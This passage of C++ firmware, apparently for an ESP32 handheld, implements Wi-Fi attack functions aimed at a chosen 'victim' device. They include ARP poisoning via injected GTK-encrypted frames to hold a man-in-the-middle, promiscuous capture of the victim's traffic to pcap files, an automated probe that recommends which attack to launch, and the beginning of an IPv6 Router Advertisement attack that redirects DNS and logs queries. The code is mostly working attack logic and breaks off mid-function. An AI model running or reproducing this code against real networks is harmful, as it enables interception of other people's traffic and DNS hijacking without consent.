    memcpy((void*)s_capRing[s_capHead].data, f, n);
    s_capRing[s_capHead].len = (uint16_t)n;
    s_capRing[s_capHead].ts  = millis();
    s_capHead = nx;
}

// ── bounce — reachability probe (ARP first, ICMP fallback) ───────────────────────
// "Is the victim actually up and reachable from here?" ARP is the reliable test on a
// LAN: every host MUST answer ARP (handled below the OS firewall), so it works even
// against a Windows box that drops ICMP echo — which is why the old ping-only probe
// wrongly reported Windows victims as unreachable. We resolve via our own lwip ARP
// (netdiscover's pattern), then try ICMP too as extra info. On a non-isolated net
// ARP resolves directly; under strict isolation it won't (use 'inject' there).
static bool isoBounce(int idx) {
    auto& dm = displayManager;
    isoHeader("reachability probe");
    uint32_t victimIp = netspyDeviceIp(idx);
    if (!victimIp)     { dm.setTextColor(TFT_RED); dm.println("Victim has no IP."); dm.printCommandScreen(); return false; }
    if (!netif_default){ dm.setTextColor(TFT_RED); dm.println("No network interface."); dm.printCommandScreen(); return false; }

    char b[56]; isoIpStr(victimIp, b, sizeof(b));
    dm.setTextColor(0x7BEF); dm.printText("Checking "); dm.printText(b); dm.println(" ...");
    dm.println("");

    // 1) ARP resolve (works vs Windows firewall).
    ip4_addr_t vt; IP4_ADDR(&vt, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
                            (victimIp >> 8) & 0xff, victimIp & 0xff);
    uint8_t mac[6]; bool arpOk = false;
    for (int t = 0; t < 24 && !arpOk; t++) {          // ~6s
        struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
        LOCK_TCPIP_CORE();
        etharp_request(netif_default, &vt);
        s8_t hit = etharp_find_addr(netif_default, &vt, &er, &ir);
        UNLOCK_TCPIP_CORE();
        if (hit >= 0 && er) { memcpy(mac, er->addr, 6); arpOk = true; break; }
        if (inputHandler.getKeyboardInput() == 'q') break;
        vTaskDelay(pdMS_TO_TICKS(250));
    }

    // 2) ICMP as a secondary datapoint (Windows usually drops it — not decisive).
    IPAddress vAddr((uint8_t)((victimIp >> 24) & 0xff), (uint8_t)((victimIp >> 16) & 0xff),
                    (uint8_t)((victimIp >> 8) & 0xff), (uint8_t)(victimIp & 0xff));
    bool icmpOk = Ping.ping(vAddr, 3);
    float ms = icmpOk ? Ping.averageTime() : 0.0f;

    // Report. Reachable if EITHER works; ARP is the authoritative "host is up".
    if (arpOk) {
        dm.setTextColor(TFT_GREEN); dm.println("REACHABLE (ARP)");
        isoMacStr(mac, b, sizeof(b));
        dm.setTextColor(0x6FE8); dm.printText("at "); dm.println(b);
    } else {
        dm.setTextColor(TFT_RED); dm.println("No ARP reply");
        dm.setTextColor(0x7BEF); dm.println("(strict isolation, or off-net)");
    }
    dm.println("");
    if (icmpOk) {
        snprintf(b, sizeof(b), "ICMP: reply %.0f ms", ms);
        dm.setTextColor(TFT_GREEN); dm.println(b);
    } else {
        dm.setTextColor(TFT_DARKGREY); dm.println("ICMP: no reply (firewall - ok)");
    }
    dm.println("");
    dm.setTextColor(TFT_DARKGREY); dm.println("any key -> back to menu");
    while (true) {
        if (inputHandler.getKeyboardInput()) break;
        if (LockScreenManager::getInstance().consumeJustUnlocked()) break;
        vTaskDelay(pdMS_TO_TICKS(30));
    }
    return true;
}

// ── portdown — targeted victim capture → SD pcap (non-disruptive) ────────────────
// Promiscuous-captures every 802.11 data frame mentioning the victim MAC and logs
// it to /apps/isoscan/NNN.pcap (Wireshark/aircrack compatible). Does NOT change our
// MAC and does NOT drop our connection. On an isolated net it sees the group frames
// involving the victim (+ anything a gateway-poison run redirects our way); on an
// L2 AP with a poison active it captures the redirected downlink. GDMA-safe: frames
// ring in RAM, flushed to SD with promiscuous paused.
static bool isoPortDown(int idx) {
    auto& dm = displayManager;
    isoHeader("victim capture");
    uint8_t vic[6];
    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return false; }
    if (!sdCardManager.isReady()) {
        dm.setTextColor(TFT_RED); dm.println("No SD — capture needs it.");
        dm.printCommandScreen(); return false;
    }

    // Allocate the pcap file (promiscuous still off → plain SD I/O).
    char path[40]; uint16_t seq = 1;
    sdCardManager.ensureDir(SD_DIR_ISOSCAN);
    while (seq <= 999) {
        snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/%03u.pcap", seq);
        if (!SD.exists(path)) break;
        seq++;
    }
    File cap = SD.open(path, FILE_WRITE);
    if (!cap) { dm.setTextColor(TFT_RED); dm.println("SD open failed."); dm.printCommandScreen(); return false; }
    pcap::writeGlobalHeader(cap);

    char b[56];
    isoMacStr(vic, b, sizeof(b));
    dm.setTextColor(0x6FE8);       dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("save victim's frames to SD (open in Wireshark)");
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText("victim");
    dm.setTextColor(TFT_CYAN);     dm.setCursor(56, outputY + LINE_HEIGHT * 3); dm.printText(b);
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 4); dm.printText("file");
    dm.setTextColor(0x6FE8);       dm.setCursor(56, outputY + LINE_HEIGHT * 4); dm.printText(path);

    // Arm capture (portdown does not do redirect classification).
    s_capHead = s_capTail = 0; s_capSeen = s_capDropped = 0;
    memcpy((void*)s_capVic, vic, 6); s_capActive = true; s_capRedirOn = false;
    wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous_rx_cb(isoCapCb);
    esp_wifi_set_promiscuous(true);

    uint32_t written = 0, lastDraw = 0, lastFlush = 0;
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[q] save + back to menu");
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        // Flush drained frames to SD with promiscuous paused (GDMA rule).
        uint8_t fill = (uint8_t)((s_capHead - s_capTail) & (ISO_CAP_RING - 1));
        if (fill && (millis() - lastFlush >= 1500 || fill > ISO_CAP_RING / 2)) {
            lastFlush = millis();
            ScopedPromiscPause _;
            while (s_capTail != s_capHead) {
                IsoCapFrame fr;
                memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
                s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
                pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
                written++;
            }
            cap.flush();
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 500) {
            snprintf(b, sizeof(b), "seen %lu  saved %lu  drop %lu",
                     (unsigned long)s_capSeen, (unsigned long)written, (unsigned long)s_capDropped);
            dm.fillRect(0, outputY + LINE_HEIGHT * 6, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setTextColor(s_capSeen ? TFT_GREEN : TFT_DARKGREY);
            dm.setCursor(6, outputY + LINE_HEIGHT * 6); dm.printText(b);
            lastDraw = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    // Stop capture, final drain, close (promiscuous off → plain SD).
    s_capActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    while (s_capTail != s_capHead) {
        IsoCapFrame fr;
        memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
        s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
        pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
        written++;
    }
    cap.close();
    dm.clearScreen(); return true;
}

// ── combined MITM — gateway poison (TX) + victim capture (RX) at once ─────────────
// The real MITM: hold a gateway ARP-poison so the victim sends its uplink to us,
// AND run promiscuous capture at the same time to (a) log the redirected traffic to
// SD and (b) COUNT the redirected frames — a nonzero count is live proof the poison
// took hold and this network does L2 delivery (a mobile hotspot L3-routes past the
// poison → count stays 0). Turns the two independent pieces into one automatic MITM.
static bool isoMitm(int idx) {
    auto& dm = displayManager;
    isoHeader("combined MITM");
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return false;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return false; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    uint8_t vic[6];
    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return false; }
    IPAddress gw = WiFi.gatewayIP();
    uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
    uint32_t victimIp = netspyDeviceIp(idx);
    if (!gwIp) { dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return false; }

    // Optional pcap of the redirected traffic (SD I/O still off-radio here).
    // Distinct `mitm_NNN.pcap` name (portdown uses NNN.pcap) — the next free slot
    // is chosen, so a run never overwrites an earlier capture.
    File cap; char path[40] = "";
    if (sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_ISOSCAN);
        uint16_t s = 1;
        while (s <= 999) { snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/mitm_%03u.pcap", s); if (!SD.exists(path)) break; s++; }
        cap = SD.open(path, FILE_WRITE);
        if (cap) pcap::writeGlobalHeader(cap);
    }

    char b[56];
    dm.setTextColor(0x6FE8); dm.setCursor(6, outputY + LINE_HEIGHT * 2);
    dm.printText(cap ? "poison + capture; is it holding? see verdict"
                     : "poison + capture (no SD - live count only)");
    // Show exactly where the capture is being written (or that it isn't).
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 10);  dm.printText("file");
    dm.setTextColor(cap ? 0x6FE8 : TFT_DARKGREY); dm.setCursor(56, outputY + LINE_HEIGHT * 10);
    dm.printText(cap ? path : "(no SD - count only)");

    // Arm capture with redirect detection.
    s_capHead = s_capTail = 0; s_capSeen = s_capDropped = s_capRedir = s_capArpAck = s_capCand = 0;
    memcpy((void*)s_capVic, vic, 6); memcpy((void*)s_capOur, src, 6);
    s_capActive = true; s_capRedirOn = true;
    wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&flt);
    esp_wifi_set_promiscuous_rx_cb(isoCapCb);
    esp_wifi_set_promiscuous(true);

    uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
    uint32_t txOk = 0, txErr = 0, written = 0;
    uint32_t lastTx = 0, lastDraw = 0, lastFlush = 0;
    // Rate-gate the "MITM LIVE" verdict: a few stray redirected frames (residue from
    // an old ARP entry) is NOT a held MITM — only a SUSTAINED data rate is. Sample the
    // redirect count over a 2s window; declare LIVE only above a real throughput.
    uint32_t winRedir0 = 0, winMs = millis(), rate = 0; bool sustained = false;
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid 1/2   [q] save + back to menu");
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }

        // Every 2s, measure real redirect throughput (frames/sec) for the verdict.
        if (millis() - winMs >= 2000) {
            uint32_t d = s_capRedir - winRedir0;
            rate = d / 2;                                 // frames per second
            sustained = (rate >= 8);                      // ~8+/s = genuinely holding
            winRedir0 = s_capRedir; winMs = millis();
        }

        // Hold the poison (~30 ms ≈ 33 fps, plenty to keep the ARP entry warm).
        if (millis() - lastTx >= 30) {
            lastTx = millis();
            esp_err_t rc = isoTxGtkArp(gtk, bssid, src, keyid, pn, seq++, gwIp, victimIp);
            if (rc == ESP_OK) txOk++; else txErr++;
            pn++;
        }

        // Flush captured frames to SD with promiscuous paused (GDMA rule).
        uint8_t fill = (uint8_t)((s_capHead - s_capTail) & (ISO_CAP_RING - 1));
        if (cap && fill && (millis() - lastFlush >= 1500 || fill > ISO_CAP_RING / 2)) {
            lastFlush = millis();
            ScopedPromiscPause _;
            while (s_capTail != s_capHead) {
                IsoCapFrame fr;
                memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
                s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
                pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
                written++;
            }
            cap.flush();
        } else if (!cap) {
            // No SD → just drain the ring so it doesn't back up (count still works).
            while (s_capTail != s_capHead) s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
        if (!dm.isBlocked() && millis() - lastDraw >= 600) {
            int y = outputY + LINE_HEIGHT * 3;
            snprintf(b, sizeof(b), "poison TX: %lu (keyid %u)", (unsigned long)txOk, keyid);
            dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT * 6, TFT_BLACK);
            dm.setTextColor(txErr ? TFT_RED : TFT_GREEN); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
            snprintf(b, sizeof(b), "victim frames: %lu  saved %lu", (unsigned long)s_capSeen, (unsigned long)written);
            dm.setTextColor(s_capSeen ? TFT_WHITE : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
            // ARP reply = victim reacted to the poison (NOT proof of interception).
            snprintf(b, sizeof(b), "poison ACK (ARP): %lu", (unsigned long)s_capArpAck);
            dm.setTextColor(s_capArpAck ? TFT_YELLOW : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT + 4;
            // The ONLY real headline: SUSTAINED victim IP DATA = MITM actually holding.
            if (sustained) {
                snprintf(b, sizeof(b), "MITM LIVE - %lu/s (%lu total)", (unsigned long)rate, (unsigned long)s_capRedir);
                dm.setTextColor(TFT_GREEN); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
                dm.setTextColor(0x6FE8); dm.setCursor(6, y); dm.printText("victim uplink is flowing to us.");
            } else if (s_capRedir) {
                snprintf(b, sizeof(b), "leak %lu - NOT held", (unsigned long)s_capRedir);
                dm.setTextColor(TFT_YELLOW); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("(stray frames, real gw wins)");
            } else if (s_capArpAck) {
                dm.setTextColor(TFT_YELLOW); dm.setCursor(6, y); dm.printText("poison seen, no data redirect"); y += LINE_HEIGHT;
                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("(victim ignores it / real gw wins)");
            } else if (s_capCand) {
                // frames matched on address but classified as neither ARP nor IP →
                // the relayed unicast-to-us payload isn't decrypted in promiscuous.
                snprintf(b, sizeof(b), "%lu frames, payload unreadable", (unsigned long)s_capCand);
                dm.setTextColor(TFT_ORANGE); dm.setCursor(6, y); dm.printText(b);
            } else {
                dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("no redirect yet...");
            }
            lastDraw = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    // Stop, final drain, close (promiscuous off → plain SD).
    s_capActive = false; s_capRedirOn = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (cap) {
        while (s_capTail != s_capHead) {
            IsoCapFrame fr;
            memcpy(&fr, (const void*)&s_capRing[s_capTail], sizeof(fr));
            s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
            pcap::writeRecord(cap, fr.data, fr.len, fr.ts);
        }
        cap.close();
    }
    dm.clearScreen(); return true;
}

// ── auto — smart probe → detect → recommend ──────────────────────────────────────
// Runs a short, mostly non-destructive probe sequence and prints a verdict + a
// recommended attack, so the operator doesn't have to hand-run each piece and infer
// L2-vs-L3 by eye (which is exactly what we did by hand during bring-up). Stages:
//   1 CCMP self-test        — is the inject crypto path healthy?
//   2 GTK read              — do we have the group key to inject with?
//   3 normal ARP resolve    — can the stack reach the victim WITHOUT us injecting?
//                             (fails under isolation → a later inject hit = bypass)
//   4 GTK inject (~6s)      — inject broadcast ARP, watch our ARP cache for a reply
//   5 poison-hold (~6s)     — brief gateway poison + redirect count = L2-vs-L3 test
//   6 bounce ping           — IP-layer reachability via the gateway
static bool isoSmartAuto(int idx) {
    auto& dm = displayManager;
    isoHeader("smart auto");
    uint32_t victimIp = netspyDeviceIp(idx);
    uint8_t  vic[6];  bool haveMac = netspyDeviceMac(idx, vic);
    const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";

    int line = outputY + LINE_HEIGHT * 2;
    auto say = [&](const char* label, const char* val, uint16_t col) {
        if (dm.isBlocked()) return;
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, line);  dm.printText(label);
        dm.setTextColor(col);          dm.setCursor(150, line); dm.printText(val);
        line += LINE_HEIGHT;
    };
    { char b[40]; snprintf(b, sizeof(b), "%.14s", nm);
      dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, line); dm.printText("target");
      dm.setTextColor(TFT_CYAN); dm.setCursor(72, line); dm.printText(b); line += LINE_HEIGHT + 4; }

    // 1 — CCMP crypto path.
    bool ccmpOk = isoCcmpSelfTest();
    say("1 CCMP self-test", ccmpOk ? "PASS" : "FAIL", ccmpOk ? TFT_GREEN : TFT_RED);

    // 2 — GTK availability.
    uint8_t gtk[32]; int glen = 0;
    bool gtkOk = netspyGetGtk(gtk, &glen) && glen == 16;
    say("2 GTK key", gtkOk ? "16B ready" : "unreadable", gtkOk ? TFT_GREEN : TFT_RED);

    const uint8_t* bm = WiFi.BSSID();
    uint8_t bssid[6]; if (bm) memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
    IPAddress lip = WiFi.localIP();
    uint32_t myIp = ((uint32_t)lip[0] << 24) | ((uint32_t)lip[1] << 16) | ((uint32_t)lip[2] << 8) | lip[3];

    // helper: is the victim currently in our ARP cache (resolved)?
    auto arpResolved = [&](uint8_t out[6]) -> bool {
        if (!netif_default || !victimIp) return false;
        ip4_addr_t vt; IP4_ADDR(&vt, (victimIp >> 24) & 0xff, (victimIp >> 16) & 0xff,
                                (victimIp >> 8) & 0xff, victimIp & 0xff);
        struct eth_addr* er = nullptr; const ip4_addr_t* ir = nullptr;
        LOCK_TCPIP_CORE();
        etharp_request(netif_default, &vt);
        s8_t hit = etharp_find_addr(netif_default, &vt, &er, &ir);
        UNLOCK_TCPIP_CORE();
        if (hit >= 0 && er) { if (out) memcpy(out, er->addr, 6); return true; }
        return false;
    };

    // 3 — can the normal stack reach the victim without us injecting? Poll ~2s.
    bool normalArp = false;
    for (int t = 0; t < 8 && !normalArp; t++) { normalArp = arpResolved(nullptr); vTaskDelay(pdMS_TO_TICKS(250)); }
    say("3 normal ARP", normalArp ? "resolves (soft/none)" : "blocked (isolated)",
        normalArp ? TFT_YELLOW : TFT_CYAN);

    // 4 — GTK inject reachability (~6s): does an injected broadcast ARP get a reply?
    bool injectReach = false;
    if (gtkOk && bm && victimIp) {
        uint64_t pn = 0x800000000000ULL; uint16_t seq = 0; uint32_t t0 = millis(), lastTx = 0;
        while (millis() - t0 < 6000 && !injectReach) {
            if (inputHandler.getKeyboardInput() == 'q') break;
            if (millis() - lastTx >= 20) { lastTx = millis(); isoTxGtkArp(gtk, bssid, src, 1, pn++, seq++, myIp, victimIp); }
            injectReach = arpResolved(nullptr);
            vTaskDelay(pdMS_TO_TICKS(20));
        }
    }
    say("4 GTK inject reach", !gtkOk ? "skipped (no GTK)" : (injectReach ? "REPLY - reachable" : "no reply"),
        injectReach ? TFT_GREEN : TFT_DARKGREY);

    // 5 — poison-hold L2/L3 test (~6s): count redirected victim uplink.
    uint32_t redir = 0, arpAck = 0, cand = 0;
    if (gtkOk && bm && haveMac) {
        IPAddress gw = WiFi.gatewayIP();
        uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
        if (gwIp) {
            s_capHead = s_capTail = 0; s_capSeen = s_capRedir = s_capArpAck = s_capCand = s_capDropped = 0;
            memcpy((void*)s_capVic, vic, 6); memcpy((void*)s_capOur, src, 6);
            s_capActive = true; s_capRedirOn = true;
            wifi_promiscuous_filter_t flt = {}; flt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
            esp_wifi_set_promiscuous_filter(&flt);
            esp_wifi_set_promiscuous_rx_cb(isoCapCb);
            esp_wifi_set_promiscuous(true);
            uint64_t pn = 0x800000000000ULL; uint16_t seq = 0; uint32_t t0 = millis(), lastTx = 0;
            while (millis() - t0 < 6000) {
                if (inputHandler.getKeyboardInput() == 'q') break;
                if (millis() - lastTx >= 30) { lastTx = millis(); isoTxGtkArp(gtk, bssid, src, 1, pn++, seq++, gwIp, victimIp); }
                // drain ring (no SD in the probe — count only)
                while (s_capTail != s_capHead) s_capTail = (uint8_t)((s_capTail + 1) % ISO_CAP_RING);
                vTaskDelay(pdMS_TO_TICKS(5));
            }
            redir = s_capRedir;
            arpAck = s_capArpAck;
            cand  = s_capCand;
            s_capActive = false; s_capRedirOn = false;
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(NULL);
        }
    }
    // redir = real IP data relayed to us (true MITM). arpAck = victim merely replied
    // to our poison (reacted, not intercepted) — reported so a green ARP-only result
    // isn't mistaken for interception.
    { char b[40];
      // >=16 redirected in the ~6s window = real throughput (not stray residue).
      bool viable = (redir >= 16);
      if (!(gtkOk && haveMac))      snprintf(b, sizeof(b), "skipped");
      else if (viable)              snprintf(b, sizeof(b), "%lu data - MITM viable", (unsigned long)redir);
      else if (redir)               snprintf(b, sizeof(b), "leak %lu - not held", (unsigned long)redir);
      else if (arpAck)              snprintf(b, sizeof(b), "%lu ACK only, no data", (unsigned long)arpAck);
      else if (cand)                snprintf(b, sizeof(b), "%lu frames, unreadable", (unsigned long)cand);
      else                          snprintf(b, sizeof(b), "no reaction");
      say("5 poison L2 test", b, viable ? TFT_GREEN : ((redir || arpAck || cand) ? TFT_YELLOW : TFT_DARKGREY)); }

    // 6 — IP-layer bounce.
    bool bounceOk = false;
    if (victimIp) {
        IPAddress vAddr((uint8_t)((victimIp >> 24) & 0xff), (uint8_t)((victimIp >> 16) & 0xff),
                        (uint8_t)((victimIp >> 8) & 0xff), (uint8_t)(victimIp & 0xff));
        bounceOk = Ping.ping(vAddr, 2);
    }
    // ICMP-only datapoint. A "no reply" here is expected on Windows (firewall drops
    // echo) and does NOT mean unreachable — stage 3's ARP resolve is the real check.
    say("6 ICMP ping", bounceOk ? "reply" : "no reply (fw ok)", bounceOk ? TFT_GREEN : TFT_DARKGREY);

    // ── verdict + recommendation ──────────────────────────────────────────────────
    line += 4;
    const char* verdict; uint16_t vcol;
    if (!ccmpOk || !gtkOk)      { verdict = "inject unavailable -> bounce/portdown"; vcol = TFT_RED; }
    else if (redir >= 16)      { verdict = "L2 MITM VIABLE -> run 'mitm'";          vcol = TFT_GREEN; }
    else if (redir || arpAck)  { verdict = "poison seen, not holding -> portdown";  vcol = TFT_YELLOW; }
    else if (injectReach)      { verdict = "1-way inject OK, no intercept -> 'dns'"; vcol = TFT_YELLOW; }
    else if (bounceOk)         { verdict = "IP-reachable -> 'portdown' capture";     vcol = TFT_YELLOW; }
    else                       { verdict = "victim unreachable -> retry / re-scan";  vcol = TFT_RED; }
    if (!dm.isBlocked()) {
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, line); dm.printText("VERDICT"); line += LINE_HEIGHT;
        dm.setTextColor(vcol);         dm.setCursor(6, line); dm.printText(verdict);
    }
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("any key -> back to menu");
    while (true) { char k = inputHandler.getKeyboardInput(); if (k) break;
                   if (LockScreenManager::getInstance().consumeJustUnlocked()) break; vTaskDelay(pdMS_TO_TICKS(30)); }
    dm.clearScreen(); return true;
}

// ── RA DNS poison — ICMPv6 Router Advertisement pointing the victim's DNS at us ──
// Injects a GTK-encrypted multicast (ff02::1) RA carrying an RDNSS option = our
// link-local IPv6. A victim that honors it uses us as its DNS server; a UDP-53
// listener logs the queries to SD. Needs IPv6 (enabled here) and, like all
// interception, a network that lets the victim's query reach us (an L2 AP; a phone
// hotspot's isolation blocks the return path). HW-gated — build/verify at the lab.

// Internet checksum over the ICMPv6 pseudo-header + message (cksum field = 0).
static uint16_t isoIcmp6Cksum(const uint8_t* s16, const uint8_t* d16, const uint8_t* m, int mlen) {
    uint32_t sum = 0;
    for (int i = 0; i < 16; i += 2) sum += (uint16_t)((s16[i] << 8) | s16[i + 1]);
    for (int i = 0; i < 16; i += 2) sum += (uint16_t)((d16[i] << 8) | d16[i + 1]);
    sum += (uint32_t)mlen;                           // upper-layer length
    sum += 58;                                       // next header = ICMPv6
    for (int i = 0; i < mlen; i += 2)
        sum += (uint16_t)((m[i] << 8) | (i + 1 < mlen ? m[i + 1] : 0));
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}

// LLC/SNAP + IPv6 + ICMPv6 RA(RDNSS = ll) into p. Returns length (88).
static int isoBuildRA(const uint8_t ll[16], uint8_t* p) {
    static const uint8_t snap[8]     = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x86, 0xDD };
    static const uint8_t allNodes[16]= { 0xFF, 0x02, 0,0,0,0,0,0,0,0,0,0,0,0,0, 0x01 };
    memcpy(p, snap, 8);
    uint8_t* ip6 = p + 8;

    uint8_t icmp[40];
    memset(icmp, 0, sizeof(icmp));
    icmp[0] = 134;                                   // Router Advertisement
    icmp[4] = 64;                                    // cur hop limit
    // router lifetime 0 (DNS-only, not a default route); reachable/retrans = 0
    icmp[16] = 25;                                   // RDNSS option
    icmp[17] = 3;                                    // length in 8-byte units (8 + 16)
    icmp[20] = icmp[21] = icmp[22] = icmp[23] = 0xFF; // RDNSS lifetime = ~infinite
    memcpy(icmp + 24, ll, 16);                       // DNS server = our link-local

    memset(ip6, 0, 40);
    ip6[0] = 0x60;                                   // version 6
    ip6[4] = 0; ip6[5] = 40;                         // payload length = ICMPv6 len
    ip6[6] = 58;                                     // next header = ICMPv6
    ip6[7] = 255;                                    // hop limit (required for RA)
    memcpy(ip6 + 8,  ll, 16);                        // src = our link-local
    memcpy(ip6 + 24, allNodes, 16);                  // dst = ff02::1

    uint16_t ck = isoIcmp6Cksum(ip6 + 8, ip6 + 24, icmp, 40);
    icmp[2] = (uint8_t)(ck >> 8); icmp[3] = (uint8_t)(ck & 0xff);
    memcpy(ip6 + 40, icmp, 40);
    return 8 + 40 + 40;
}

// Parse the first QNAME out of a DNS query payload (header 12B + labels).
static bool isoDnsName(const uint8_t* b, int len, char* out, int outsz) {
    if (len < 13) return false;
    int o = 12, on = 0;
    while (o < len) {
        uint8_t l = b[o++];
        if (l == 0) break;
        if (l & 0xC0) return false;                  // no compression in a query
        if (o + l > len) return false;
        for (int i = 0; i < l; i++)
            if (on < outsz - 1) { char c = b[o + i]; out[on++] = (c >= 32 && c < 127) ? c : '?'; }
        if (on < outsz - 1) out[on++] = '.';
        o += l;
    }
    if (on > 0 && out[on - 1] == '.') on--;
    out[on] = '\0';
    return on > 0;
}

// The RA hands the victim our IPv6 link-local as its DNS server, so queries arrive
// over IPv6 — a plain WiFiUDP binds IPv4-only and misses them. A raw lwip pcb bound
// to IPADDR_TYPE_ANY catches both. The recv cb runs in the tcpip thread, so it only
// parses + rings the query; the main loop drains it (SD log + on-screen list).
struct IsoDnsQ { char dom[48]; char src[46]; };
static volatile IsoDnsQ s_dnsRing[8];
static volatile uint8_t s_dnsHead = 0, s_dnsTail = 0;

static void isoDnsRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p,
                       const ip_addr_t* addr, u16_t port) {
    (void)arg; (void)pcb; (void)port;
    if (!p) return;
    uint8_t buf[256];
    int n = (int)pbuf_copy_partial(p, buf, sizeof(buf), 0);
    char dom[48];
    if (n > 0 && addr && isoDnsName(buf, n, dom, sizeof(dom))) {
        uint8_t nx = (uint8_t)((s_dnsHead + 1) % 8);
        if (nx != s_dnsTail) {
            strncpy((char*)s_dnsRing[s_dnsHead].dom, dom, sizeof(s_dnsRing[0].dom) - 1);
            s_dnsRing[s_dnsHead].dom[sizeof(s_dnsRing[0].dom) - 1] = '\0';
            ipaddr_ntoa_r(addr, (char*)s_dnsRing[s_dnsHead].src, sizeof(s_dnsRing[0].src));
            s_dnsHead = nx;
        }
    }
    pbuf_free(p);
}

static bool isoRaDns(int idx) {
    auto& dm = displayManager;
    (void)idx;                                       // RA is multicast — hits all clients
    isoHeader("RA DNS poison");
    uint8_t gtk[32]; int glen = 0;
    if (!netspyGetGtk(gtk, &glen) || glen != 16) {
        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return false;
    }
    const uint8_t* bm = WiFi.BSSID();
    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return false; }
    uint8_t bssid[6]; memcpy(bssid, bm, 6);
    uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);

    dm.setTextColor(0x7BEF); dm.println("Bringing up IPv6 link-local...");
    WiFi.enableIpV6();
    esp_netif_t* nif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    uint8_t ll[16]; bool haveLL = false;
    if (nif) {
